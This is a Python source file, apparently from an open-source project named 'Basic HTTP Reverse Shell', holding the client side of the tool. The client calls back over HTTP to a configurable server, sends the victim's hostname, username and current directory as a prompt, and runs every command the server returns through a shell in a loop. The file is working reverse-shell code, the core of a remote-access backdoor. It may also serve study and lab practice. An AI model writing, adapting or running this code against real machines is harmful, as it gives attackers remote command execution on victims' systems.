#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Basic-HTTP-Reverse-Shell

__author__ = "EONRaider @ keybase.io/eonraider"

import getpass
import http.client
import platform
from urllib import request, parse

from src.client.commands import ClientCommands


class Client:
    def __init__(self,
                 server_address: str,
                 server_port: int):
        self.server_url = f"http://{server_address}:{server_port}"
        self.commands = ClientCommands(self)

    @property
    def shell_prompt(self) -> str:
        return f"{platform.node()}@{getpass.getuser()}:" \
               f"{str(self.commands.get_cwd())}$ "

    def execute(self) -> None:
        while True:
            try:
                response: str = self.post({"prompt": self.shell_prompt})
            except (http.client.RemoteDisconnected, KeyboardInterrupt):
                break
            cmd, *args = response.split(" ")
            try:
                if len(cmd) == 0:    # "cmd" is an empty string
                    continue
                else:                # "cmd" is a user-defined command
                    getattr(self.commands, cmd)(args)
            except AttributeError:   # "cmd" is a standard shell command
                self.commands.shell(response)

    def post(self, request_body: dict[str, str]) -> str:
        request_body: bytes = parse.urlencode(request_body).encode()
        req = request.Request(self.server_url, data=request_body)
        return request.urlopen(req).read().decode()


if __name__ == "__main__":
    SERVER_ADDRESS = "localhost"
    SERVER_PORT = 8080

    Client(SERVER_ADDRESS, SERVER_PORT).execute()
